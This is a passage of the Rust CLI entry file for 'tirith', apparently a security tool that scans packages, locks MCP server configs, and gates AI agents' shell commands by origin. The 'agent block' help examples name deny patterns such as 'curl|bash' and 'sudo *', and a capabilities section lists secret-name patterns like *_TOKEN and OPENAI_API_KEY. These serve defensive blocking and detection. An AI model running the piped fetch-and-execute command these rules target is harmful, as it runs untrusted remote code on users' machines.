deterministic package-risk engine and checked for the slopsquat (AI-hallucinated
name) pattern. Offline by default — name and typosquat signals come from the
local threat database. --online additionally consults the registry API for
provenance signals; it is ignored under --offline / TIRITH_OFFLINE and a
registry failure degrades gracefully. Findings respect the policy allowlist.

--installed switches to scanning *installed* trees instead — walking
node_modules/<pkg>/package.json, site-packages/<dist-info>/METADATA,
vendor/<pkg>/ for Go modules, and the workspace Cargo.lock. This reports what
is actually on disk, which can drift from the manifest's intent. Use
--max-installed-entries to cap the walk (default 5000; pass 0 to disable
the cap, which is slow on large trees).")]
    Scan {
        /// Project directory to scan (or a single manifest file).
        /// Defaults to the current directory.
        path: Option<String>,
        /// Also consult each package's registry API (npm / PyPI / crates.io)
        /// for provenance signals. Off by default — this is the only path on
        /// which `ecosystem scan` reaches the network. Ignored when --offline
        /// or TIRITH_OFFLINE is set; a registry failure degrades gracefully.
        #[arg(long)]
        online: bool,
        /// Force offline scoring even if --online is passed. Also honored via
        /// the TIRITH_OFFLINE environment variable.
        #[arg(long)]
        offline: bool,
        /// Scan installed trees (node_modules/, site-packages/, vendor/,
        /// Cargo.lock) instead of declared-dependency manifests.
        #[arg(long)]
        installed: bool,
        /// Cap the installed-tree walk at N entries. 0 means unbounded.
        /// Default 5000; valid range 100-200000 (or 0).
        #[arg(long, default_value_t = 5000)]
        max_installed_entries: usize,
        /// Do not prompt for confirmation under --installed --online when the
        /// estimated network call count is large. Pass this in CI.
        #[arg(long)]
        non_interactive: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum McpAction {
    /// Generate or update .tirith/mcp.lock from the repo's MCP configs
    #[command(after_help = "\
Discovers the repository's MCP configuration files, builds a structured
inventory of every declared MCP server, and writes a deterministic lockfile to
.tirith/mcp.lock at the repository root.

If no MCP configuration is found, that is reported plainly — it is not an
error; an empty lockfile is still written so a later check has a baseline.

Examples:
  tirith mcp lock
  tirith mcp lock --format json")]
    Lock {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Verify that the current MCP inventory matches .tirith/mcp.lock (gates on drift)
    #[command(after_help = "\
Loads the committed .tirith/mcp.lock baseline, rebuilds the current MCP-server
inventory from the repo's configuration files, and reports any drift — an MCP
server added, removed, or altered (transport, env, declared tools, or URL
credentials) since the lockfile was taken.

This is the gating companion to `tirith mcp lock`: use it in CI to fail a
build when an MCP surface change lands without a lockfile refresh. The human
output never prints env values or URL userinfos — only the redacted / hashed
form the lockfile already carries.

Exit codes:
  0  inventory matches the lockfile (no drift).
  1  drift detected — the inventory and the lockfile differ.
  2  usage error — no lockfile to verify against, cannot read it, the
     repository root could not be determined, or another operational failure.

Examples:
  tirith mcp verify
  tirith mcp verify --format json")]
    Verify {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show the drift between the current MCP inventory and .tirith/mcp.lock (informational)
    #[command(after_help = "\
Shows the same drift `tirith mcp verify` computes, but as an informational
diff — never gates a CI build. Use it to inspect what an edit to an MCP
config will do before running `tirith mcp lock` to refresh the committed
lockfile.

The human output groups drifts as added / removed / changed, naming each
server by its declared name. Env values and URL userinfos are never printed
— only that the variable / credential changed, and only on a per-name basis.

Exit codes:
  0  normal — `diff` is informational, so this exit code is returned whether
     drift is present or not. Use `tirith mcp verify` to gate.
  2  usage error — no lockfile to diff against, cannot read it, the
     repository root could not be determined, or another operational failure.
     Distinct from 0 so a piped consumer can tell \"no drift\" apart from
     \"there was nothing to compare\".

Examples:
  tirith mcp diff
  tirith mcp diff --format json")]
    Diff {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Scaffold a starter MCP policy from .tirith/mcp.lock
    #[command(
        name = "policy",
        after_help = "\
Reads the committed .tirith/mcp.lock and writes .tirith/mcp-policy.yaml.example
— a scaffold of `scan.trusted_mcp_servers` and `scan.mcp_allowed_tools` entries
listing every server currently locked and the tools it currently exposes.

Every entry in the example is commented out by design: copying the file
straight into your policy must NEVER silently widen trust. The operator
reviews the scaffold, uncomments the entries they intend to declare, and
merges them into .tirith/policy.yaml.

A separate .example file is cleaner than mutating an existing policy.yaml —
you can diff the scaffold against your working policy and integrate the bits
you want.

Determinism: running `tirith mcp policy init` twice against the same lockfile
produces a byte-identical example file. The lockfile is already sorted by
(name, source_config), so server order is stable.

Examples:
  tirith mcp policy init
  tirith mcp policy init --force            # overwrite an existing example
  tirith mcp policy init --format json     # planned-policy preview"
    )]
    Policy {
        #[command(subcommand)]
        action: McpPolicyAction,
    },

    /// Explain one MCP server entry in .tirith/mcp.lock
    #[command(after_help = "\
Loads `.tirith/mcp.lock` and prints what the lockfile records for the
named server: declared tools (or the wildcard \"all tools\" state when
the source config omitted the `tools` key), the redacted transport,
injected environment variable **names** (never values), and the
capabilities the lockfile implies. Env values and URL userinfos are
never printed — the lockfile stores only their salted hashes and this
explainer respects the same boundary `verify` and `diff` enforce.

Server lookup is **case-sensitive exact**. When the named server is
missing, the explainer suggests the closest match by prefix and then
edit distance so a typo doesn't strand the operator.

Exit codes:
  0  the server was found and its details were printed.
  1  the lockfile is missing or unreadable, the server name was not found,
     or JSON output could not be written.
  2  usage error (none defined today; reserved).

Examples:
  tirith mcp explain my-server
  tirith mcp explain my-server --format json")]
    Explain {
        /// Server name as recorded in .tirith/mcp.lock (case-sensitive exact)
        server: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show a per-permission view of every server in .tirith/mcp.lock
    #[command(after_help = "\
Loads `.tirith/mcp.lock` and aggregates a per-capability view across every
locked MCP server. For each capability the lockfile implies (network,
process-spawn, filesystem-read-via-stdio, environment-secret, github-api,
runtime-tool-wildcard, …) the report lists which servers declare it.

Capabilities are **derived from the lockfile's structure**, not parsed
from a permissions key — the MCP lockfile schema today does not store an
explicit capabilities/permissions list per server, so this view infers
them from the transport (`url` ⇒ network, `stdio` ⇒ process-spawn) plus
heuristics over env names (`*_TOKEN`, `*_KEY`, `*_SECRET`, `GITHUB_*`,
`OPENAI_API_KEY`, …) and tool declarations (omitted ⇒ runtime-tool
wildcard). The derivation is informational and explicit: every signal is
labelled with the field it came from so an operator can correlate the
finding back to the lockfile entry.

Wildcards (a server with the `tools` key omitted, which an MCP client
treats as \"may call any runtime-exposed tool\") and unbounded
permissions surface in a separate `wildcards:` section so the operator
sees broad-trust servers at a glance.

Exit codes:
  0  the aggregation was produced (zero or more capability groups).
  1  the lockfile is missing or unreadable, or JSON output could not
     be written.
  2  usage error (none defined today; reserved).

Examples:
  tirith mcp permissions
  tirith mcp permissions --format json")]
    Permissions {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum McpPolicyAction {
    /// Scaffold a starter MCP policy from the current lockfile
    #[command(after_help = "\
Examples:
  tirith mcp policy init
  tirith mcp policy init --force
  tirith mcp policy init --format json")]
    Init {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
        /// Overwrite an existing .tirith/mcp-policy.yaml.example
        #[arg(long)]
        force: bool,
    },
}

#[derive(Subcommand)]
enum AgentAction {
    /// List recent audit-log sessions grouped by agent origin
    #[command(after_help = "\
Reads the local JSONL audit log (default: $XDG_DATA_HOME/tirith/log.jsonl)
and aggregates every `verdict` entry by its recorded `AgentOrigin`. For
each origin group it reports the entry count, last-seen timestamp, and an
Allow / Warn / Block histogram so an operator can see at a glance which
classes of caller are producing which classes of verdict.

Entries with no `agent_origin` field (pre-chunk-1 audit lines, hook
telemetry, and any audit caller that did not stamp an origin before
calling `audit::log_verdict`) land in an explicit `unknown` group rather
than being silently dropped — honesty over apparent tidiness. Origin
attribution is best-effort and improves incrementally: chunk 3 removed
the engine's bypass-path audit (previously the engine logged once
without origin, then the CLI logged again with origin — a double entry
where one was attributed and the other was not) and stamped origin on
the `check`, `paste`, `install`, `ecosystem`, MCP, and gateway audit
sites. Other audit-writing paths added in future work may still ship
without origin until they adopt the same stamping pattern; those entries
remain in the `unknown` group rather than being attributed by guess.

Exit codes:
  0  the aggregation ran (zero or more groups reported).
  1  the audit log could not be read, or the JSON output could not be
     written.
  2  usage error (none defined today; reserved).

Examples:
  tirith agent sessions
  tirith agent sessions --format json")]
    Sessions {
        /// Path to the audit log JSONL file (default: $XDG_DATA_HOME/tirith/log.jsonl)
        #[arg(long)]
        log: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Explain the agent-origin attribution chain for a session or command
    #[command(after_help = "\
Given a session ID (an exact session id from `tirith agent sessions`) or a
command substring, locates the matching `verdict` entries in the audit log
and prints the attribution chain: `AgentOrigin`, redacted command, action,
timestamps, and the rule IDs that fired.

Search is **exact on session id, substring (case-insensitive) on command**.
Up to 20 matching entries are shown. With `--format json` the structured
payload carries every match, sorted newest-first.

Exit codes:
  0  one or more entries matched.
  1  no matches, or the audit log could not be read, or the JSON output
     could not be written.

Examples:
  tirith agent explain sess-abc123
  tirith agent explain curl
  tirith agent explain claude-code --format json")]
    Explain {
        /// Session ID or command substring to search for
        session_id_or_command: String,
        /// Path to the audit log JSONL file (default: $XDG_DATA_HOME/tirith/log.jsonl)
        #[arg(long)]
        log: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Scaffold an opt-in starter agent-governance policy from observed origins
    #[command(
        name = "policy",
        after_help = "\
Examples:
  tirith agent policy init
  tirith agent policy init --force
  tirith agent policy init --format json"
    )]
    Policy {
        #[command(subcommand)]
        action: AgentPolicyAction,
    },

    /// Validate an agent-matcher and print the policy snippet to add
    #[command(after_help = "\
Validates a `(kind, tool?)` matcher pair and emits the YAML snippet to paste
into `agent_rules.allow` under `.tirith/policy.yaml` (or
`.tirith/agent-policy.yaml.example`). **Does NOT mutate the policy** — the
operator copies the printed snippet into the file they wish to edit. Since
chunk 3 made `agent_rules` a live enforcement gate (a matching `deny`
forces a Block), keeping `allow` (the print-only command) separate from
any file mutation lets the operator review and place the snippet
deliberately rather than have a CLI silently extend a policy that now
affects live verdicts.

`kind` must be one of `human` / `agent` / `mcp` / `gateway` / `ci` / `ide`.
`tool` is optional and applies only when the kind carries a caller-claimed
payload (`agent`, `mcp`, `ci`, `ide`) — a tool filter on `human` or
`gateway` matches nothing and is rejected up-front.

Exit codes:
  0  the matcher is valid; the snippet was printed.
  1  the matcher is invalid, or the JSON output could not be written.
  2  usage error (none defined today; reserved).

Examples:
  tirith agent allow --kind agent --tool claude-code
  tirith agent allow --kind mcp --tool Cursor
  tirith agent allow --kind human
  tirith agent allow --kind agent --tool claude-code --format json")]
    Allow {
        /// Origin kind: human, agent, mcp, gateway, ci, ide
        #[arg(long)]
        kind: String,
        /// Caller-claimed payload to match (tool name / client name / provider / IDE name).
        /// Optional; omit to match every origin of the given kind.
        #[arg(long)]
        tool: Option<String>,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Validate an agent-matcher and print the deny snippet to add
    #[command(after_help = "\
Validates a `(kind, tool?)` matcher pair and emits the YAML snippet to paste
into `agent_rules.deny` under `.tirith/policy.yaml`. A `<pattern>` positional
is also accepted and echoed back as a comment beside the snippet — it is NOT
written into the matcher itself, because the engine's `agent_rules` schema
today matches only on `(kind, name)`; per-command pattern filtering on the
agent path is a planned extension that does not yet land in
`apply_agent_rules`. The pattern serves as operator documentation: what the
deny rule is supposed to cover when the schema gains command matching.

**Does NOT mutate `.tirith/policy.yaml`** — same operator-paste discipline
that `tirith agent allow` follows: the operator copies the snippet into the
file they wish to edit so a CLI never silently extends an enforcement-active
policy. `deny` beats `allow`, so adding a matcher here forces a Block whenever
the engine's verdict applies (per the agent-governance enforcement scope
described under `tirith agent allow`).

`kind` must be one of `human` / `agent` / `mcp` / `gateway` / `ci` / `ide`.
`tool` is optional and applies only when the kind carries a caller-claimed
payload (`agent`, `mcp`, `ci`, `ide`) — a tool filter on `human` or
`gateway` matches nothing and is rejected up-front.

Exit codes:
  0  the matcher is valid; the snippet was printed.
  1  the matcher is invalid, or the JSON output could not be written.
  2  usage error (none defined today; reserved).

Examples:
  tirith agent block --kind agent --tool untrusted-tool \"curl|bash\"
  tirith agent block --kind mcp --tool sketchy-server \"*\"
  tirith agent block --kind agent --tool codex \"sudo *\"
  tirith agent block --kind agent --tool untrusted-tool \"*\" --format json")]
    Block {
        /// Origin kind: human, agent, mcp, gateway, ci, ide
        #[arg(long)]
        kind: String,
        /// Caller-claimed payload to match (tool name / client name / provider / IDE name).
        /// Optional; omit to match every origin of the given kind. Stored on
        /// the variant under the spec name `payload` though it surfaces on
        /// the command line as `--tool` for symmetry with `tirith agent allow`.
        #[arg(long = "tool")]
        payload: Option<String>,
        /// Command pattern this deny rule is conceptually scoped to. Echoed
        /// back as a YAML comment for operator documentation; not yet folded
        /// into the matcher itself (the engine schema matches only on
        /// `(kind, name)` today).
        command_pattern: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Print the current process's claimed agent origin
    #[command(after_help = "\
Resolves the current process's [`AgentOrigin`] the same way `tirith check`
does (via `tirith_core::agent_origin::resolve_cli_origin`) and prints what
the engine would attribute this caller as. Useful for shell hooks and CI
debugging: it answers \"what does tirith think I am right now?\" without
having to run a verdict-producing command and inspect the audit log.

The signal is **caller-claimed**: `TIRITH_INTEGRATION` and the CI-provider
env vars are settable by any process running as the user, so this report
identifies an honest caller's category, never authenticates a hostile one.

Exit codes:
  0  the origin was printed.
  1  the JSON output could not be written.

Examples:
  tirith agent current
  TIRITH_INTEGRATION=claude-code tirith agent current
  tirith agent current --format json")]
    Current {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum AgentPolicyAction {
    /// Scaffold .tirith/agent-policy.yaml.example from observed audit-log origins
    #[command(after_help = "\
Reads the local audit log, collects every distinct `AgentOrigin` it has
recorded, and writes `.tirith/agent-policy.yaml.example` listing every
observed origin as a **commented-out** entry under `agent_rules.allow`.
The operator reviews the scaffold, uncomments the entries they intend to
declare, and merges them into `.tirith/policy.yaml` themselves.

Commented-out by design — importing the example must NEVER silently widen
trust. Mirrors the `tirith mcp policy init` convention.

Determinism: server / kind groups are sorted (kind, then payload), so two
runs against the same audit log produce a byte-identical scaffold.

Exit codes:
  0  the example was written (a missing or empty audit log still writes a
     header-only template so the operator has a starting point).
  1  the repo root could not be determined, the example file already
     exists without `--force`, the audit log is unreadable, or the file
     could not be written.

Examples:
  tirith agent policy init
  tirith agent policy init --force
  tirith agent policy init --format json")]
    Init {
        /// Path to the audit log JSONL file (default: $XDG_DATA_HOME/tirith/log.jsonl)
        #[arg(long)]
        log: Option<String>,
        /// Overwrite an existing .tirith/agent-policy.yaml.example
        #[arg(long)]
        force: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

#[derive(Subcommand)]
enum ThreatDbAction {
    /// Download or update the threat intelligence database
    #[command(after_help = "\
Examples:
  tirith threat-db update
  tirith threat-db update --force")]
    Update {
        /// Force re-download even if up to date (bypasses rollback protection)
        #[arg(long)]
        force: bool,

        /// Run as a background update process (used internally by auto-update)
        #[arg(long, hide = true)]
        background: bool,
    },
    /// Show threat DB status, age, and entry counts
    #[command(after_help = "\
Examples:
  tirith threat-db status
  tirith threat-db status --format json")]
    Status {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Explain what the threat DB knows about a domain, package, or IP
    #[command(after_help = "\
Examples:
  tirith threat-db explain react
  tirith threat-db explain npm:left-pad
  tirith threat-db explain example.com
  tirith threat-db explain 203.0.113.50 --format json")]
    Explain {
        /// Indicator to look up: a domain, a package name (optionally
        /// `ecosystem:name` or `name@version`), or an IPv4 address.
        indicator: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// List the threat-intelligence sources the DB is built from
    #[command(after_help = "\
Examples:
  tirith threat-db sources
  tirith threat-db sources --format json")]
    Sources {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Report threat DB health: install, signature, staleness, counts
    #[command(after_help = "\
Examples:
  tirith threat-db health
  tirith threat-db health --format json")]
    Health {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
    /// Summarize what changed in the DB since a given version or date
    #[command(after_help = "\
Examples:
  tirith threat-db diff --since 42
  tirith threat-db diff --since 2026-01-15
  tirith threat-db diff --since 2026-01-15 --format json")]
    Diff {
        /// Compare against this point: a DB version number (build sequence)
        /// or an ISO date (YYYY-MM-DD).
        #[arg(long)]
        since: String,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },
}

/// Process entry point. tirith's real logic runs in [`run`], on a thread with
/// an explicit 16 MiB stack: `clap` builds and parses tirith's large command
/// tree at startup, which is stack-heavy, and Windows' ~1 MiB default
/// main-thread stack overflows it once the CLI grows. A generous stack keeps
/// startup safe on every platform regardless of how the command set expands.
fn main() {
    // Internal capsule launcher (`tirith __capsule-child ...`, Stack E unit E2)
    // must run while the process is single-threaded: seccomp filters only the
    // calling thread and Landlock is incompatible with thread-sync, so containment
    // has to be applied before any worker thread exists. Intercept it HERE, before
    // the `tirith-main` worker spawn below, and handle it on the genuinely
    // single-threaded main thread. `run_on_main_thread` never returns on success
    // (it `execve`s the contained target) and exits non-zero on failure; it never
    // falls through to running the target uncontained.
    let raw_args: Vec<String> = std::env::args().collect();
    if cli::capsule_child::is_invocation(&raw_args) {
        cli::capsule_child::run_on_main_thread(&raw_args);
    }

    let handle = std::thread::Builder::new()
        .name("tirith-main".to_string())
        .stack_size(16 * 1024 * 1024)
        .spawn(run)
        .expect("failed to spawn tirith main thread");
    if handle.join().is_err() {
        // `run` panicked (hook already reported it); exit 101 without re-panicking.
        std::process::exit(101);
    }
}

fn run() {
    // Reset SIGPIPE to default so piping to head/grep exits cleanly instead of panicking.
    #[cfg(unix)]
    unsafe {
        libc::signal(libc::SIGPIPE, libc::SIG_DFL);
    }

    let cli = Cli::parse();
    cli::init_quiet(cli.quiet);

    let exit_code = match cli.command {
        Commands::Daemon { action } => match action {
            DaemonAction::Start { detach } => cli::daemon::start(detach),
            DaemonAction::Stop => cli::daemon::stop(),
            DaemonAction::Status => cli::daemon::status(),
        },

        Commands::Check {
            shell,
            format,
            json,
            non_interactive,
            interactive,
            approval_check,
            strict_warn,
            no_daemon,
            warn_only,
            defer,
            offline,
            suggest_safe_command,
            card,
            cmd,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            // `shell_join` preserves argv word boundaries so a multi-word arg
            // can't be re-split and skew the verdict (CodeRabbit R13c).
            cli::check::run(
                &cli::shell_join(&cmd),
                &shell,
                json,
                non_interactive,
                interactive,
                approval_check,
                strict_warn,
                no_daemon,
                warn_only,
                defer,
                offline,
                suggest_safe_command,
                card,
            )
        }

        Commands::Paste {
            shell,
            format,
            json,
            non_interactive,
            interactive,
            html,
            with_source,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::paste::run(
                &shell,
                json,
                non_interactive,
                interactive,
                html.as_deref(),
                with_source,
            )
        }

        #[cfg(unix)]
        Commands::Run {
            url,
            no_exec,
            capsule,
            format,
            json,
            sha256,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::run::run(&url, no_exec, json, capsule, sha256)
        }

        Commands::Install {
            source,
            args,
            online,
            offline,
            format,
            json,
            yes,
            no_exec,
            sha256,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::install::run(source, &args, online, offline, json, yes, no_exec, sha256)
        }

        Commands::Pkg { action } => {
            let pkg_action = match action {
                PkgAction::Approve {
                    ecosystem,
                    requirements,
                    target,
                    index_url,
                    format,
                    json,
                } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::pkg::PkgAction::Approve {
                        ecosystem: ecosystem.into_core(),
                        requirements,
                        target,
                        index_url,
                        json,
                    }
                }
                PkgAction::Install {
                    ecosystem,
                    requirements,
                    target,
                    index_url,
                    yes,
                    allow_degraded,
                    format,
                    json,
                } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::pkg::PkgAction::Install {
                        ecosystem: ecosystem.into_core(),
                        requirements,
                        target,
                        index_url,
                        yes,
                        allow_degraded,
                        json,
                    }
                }
                PkgAction::VerifyEnv {
                    target,
                    packages,
                    format,
                    json,
                } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::pkg::PkgAction::VerifyEnv {
                        target,
                        packages,
                        json,
                    }
                }
                PkgAction::Receipt { query } => {
                    let (which, json) = match query {
                        PkgReceiptQuery::List { format, json } => {
                            let (_, json) = HumanJsonFormat::resolve(format, json);
                            (cli::pkg::ReceiptQuery::List, json)
                        }
                        PkgReceiptQuery::Last { format, json } => {
                            let (_, json) = HumanJsonFormat::resolve(format, json);
                            (cli::pkg::ReceiptQuery::Last, json)
                        }
                        PkgReceiptQuery::Show {
                            receipt_id,
                            format,
                            json,
                        } => {
                            let (_, json) = HumanJsonFormat::resolve(format, json);
                            (cli::pkg::ReceiptQuery::Show(receipt_id), json)
                        }
                    };
                    cli::pkg::PkgAction::Receipt { which, json }
                }
            };
            cli::pkg::run(pkg_action)
        }

        Commands::Lab {
            filter,
            non_interactive,
            score,
            format,
            json,
        } => {
            let (_, want_json) = HumanJsonFormat::resolve(format, json);
            // Gate interactivity on both stdout (don't write prompts into a
            // pipe) and stdin (don't block on a closed/redirected stdin).
            let interactive = !non_interactive
                && !want_json
                && is_terminal::is_terminal(std::io::stdout())
                && is_terminal::is_terminal(std::io::stdin());
            cli::lab::run(interactive, filter.as_deref(), want_json, score)
        }

        Commands::Score {
            url,
            explain,
            format,
            json,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::score::run(&url, json, explain)
        }

        Commands::Diff { url, format, json } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::diff::run(&url, json)
        }

        Commands::Explain {
            rule,
            list,
            category,
            finding,
            fix,
            format,
            json,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::explain::run(
                rule.as_deref(),
                list,
                category.as_deref(),
                finding.as_deref(),
                fix,
                json,
            )
        }

        Commands::Why { format, json } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            cli::why::run(json)
        }

        Commands::Scan {
            path,
            file,
            stdin,
            ci,
            fail_on,
            format,
            json,
            sarif,
            ignore,
            include,
            exclude,
            profile,
        } => {
            let (_, json, sarif) = HumanJsonSarifFormat::resolve(format, json, sarif);
            cli::scan::run(
                path.as_deref(),
                file.as_deref(),
                stdin,
                ci,
                &fail_on,
                json,
                sarif,
                &ignore,
                &include,
                &exclude,
                profile.as_deref(),
            )
        }

        #[cfg(unix)]
        Commands::Fetch {
            url,
            save,
            sha256,
            format,
            json,
        } => {
            let (_, json) = HumanJsonFormat::resolve(format, json);
            match save {
                Some(path) => cli::fetch::save(&url, &path, sha256, json),
                None => cli::fetch::run(&url, json),
            }
        }

        Commands::Fix {
            shell,
            non_interactive,
            json,
            command,
        } => cli::fix::run(&command, &shell, non_interactive, json),

        Commands::McpServer {
            sanitize_tool_output,
        } => cli::mcp_server::run(sanitize_tool_output),

        Commands::Mcp { action } => match action {
            McpAction::Lock { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::mcp::lock(json)
            }
            McpAction::Verify { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::mcp::verify(json)
            }
            McpAction::Diff { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::mcp::diff(json)
            }
            McpAction::Policy { action } => match action {
                McpPolicyAction::Init {
                    format,
                    json,
                    force,
                } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::mcp::policy_init(json, force)
                }
            },
            McpAction::Explain {
                server,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::mcp::explain(&server, json)
            }
            McpAction::Permissions { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::mcp::permissions(json)
            }
        },

        Commands::Agent { action } => match action {
            AgentAction::Sessions { log, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::agent::sessions(log.as_deref(), json)
            }
            AgentAction::Explain {
                session_id_or_command,
                log,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::agent::explain(&session_id_or_command, log.as_deref(), json)
            }
            AgentAction::Policy { action } => match action {
                AgentPolicyAction::Init {
                    log,
                    force,
                    format,
                    json,
                } => {
                    let (_, json) = HumanJsonFormat::resolve(format, json);
                    cli::agent::policy_init(log.as_deref(), force, json)
                }
            },
            AgentAction::Allow {
                kind,
                tool,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::agent::allow(&kind, tool.as_deref(), json)
            }
            AgentAction::Block {
                kind,
                payload,
                command_pattern,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::agent::block(&kind, payload.as_deref(), &command_pattern, json)
            }
            AgentAction::Current { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::agent::current(json)
            }
        },

        Commands::Gateway { action } => match action {
            GatewayAction::Run {
                upstream_bin,
                upstream_arg,
                config,
                filter_output,
                capsule,
            } => cli::gateway::run_gateway_with_options(
                &upstream_bin,
                &upstream_arg,
                &config,
                cli::gateway::GatewayOptions {
                    filter_output,
                    capsule,
                },
            ),
            GatewayAction::ValidateConfig { config } => cli::gateway::validate_config(&config),
        },

        Commands::Setup {
            tool,
            scope,
            with_mcp,
            install_zshenv,
            dry_run,
            force,
            update_configs,
        } => cli::setup::run(
            &tool,
            scope.as_deref(),
            with_mcp,
            install_zshenv,
            dry_run,
            force,
            update_configs,
        ),

        Commands::Policy { action } => match action {
            PolicyAction::Init {
                force,
                minimal,
                template,
            } => cli::policy::init(force, minimal, template.as_deref()),
            PolicyAction::Validate {
                path_pos,
                path,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::policy::validate(path_pos.or(path).as_deref(), json)
            }
            PolicyAction::Effective { format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::policy::effective(json)
            }
            PolicyAction::Test {
                command,
                file,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::policy::test(command.as_deref(), file.as_deref(), json)
            }
            PolicyAction::Tune {
                from_audit,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::policy::tune(from_audit, json)
            }
        },

        Commands::Rule { action } => match action {
            RuleAction::Test {
                rule,
                input,
                shell,
                format,
                json,
            } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::rule::test(&rule, &input, &shell, json)
            }
            RuleAction::Validate { path, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::rule::validate(path.as_deref(), json)
            }
            RuleAction::Explain { rule, format, json } => {
                let (_, json) = HumanJsonFormat::resolve(format, json);
                cli::rule::explain(&rule, json)
            }
        },

        Commands::HookEvent {
            integration,
            hook_type,
            event,
            elapsed_ms,
            detail,
        } => cli::hook_event::run(
            &integration,
            &hook_type,
            &event,
            elapsed_ms,
            detail.as_deref(),
        ),

        Commands::Audit { action } => match action {
            AuditAction::Export {
                format,
                since,
                until,
                session,
                action,
                rule_id,
                entry_type,
            } => {
                let format_str = match format {
                    AuditExportFormat::Json => "json",
                    AuditExportFormat::Csv => "csv",
                };
                cli::audit::export(
                    format_str,
                    since.as_deref(),
                    until.as_deref(),
                    session.as_deref(),
                    action.as_deref(),
                    &rule_id,
                    &entry_type,
                )
            }
            AuditAction::Stats {
                session,
                format,
                json,
                entry_type,
            } => {
